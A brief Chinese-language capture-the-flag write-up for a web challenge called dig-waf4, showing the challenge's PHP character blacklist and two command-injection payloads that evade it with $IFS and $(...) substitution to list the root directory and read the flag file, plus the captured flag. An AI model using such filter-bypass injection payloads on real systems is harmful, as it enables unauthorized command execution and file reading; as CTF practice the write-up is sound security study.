#Web

## 題目

**dig-waf4**
給了一個網址，跟 [[Dig waf 3]] 的長一樣，但 blacklist 多了偵測 `{`、`}`、`` ` ``
```
```php
$blacklist = ["|", "&", ";", ">", "<", "\n", "\t", "{", "}", ",", "`",
			 "f", "l", "a", "g", " ",];
```

## 解題
1. 觀察網頁，發現 [[Dig waf 3]] 的方法可解 -> `bbb'$IFS$(echo$IFS/*)'`
   ![[W1-16_ls.png]]
2. 讀出 flag：輸入 `bbb'$IFS$(sed$IFS''$IFS/*_o2837ry)'`
   ![[W1-16_flag.png|510]]
3. flag = `CTF{digtools_waf4_0fe84a84cedd13b36531f17d}`
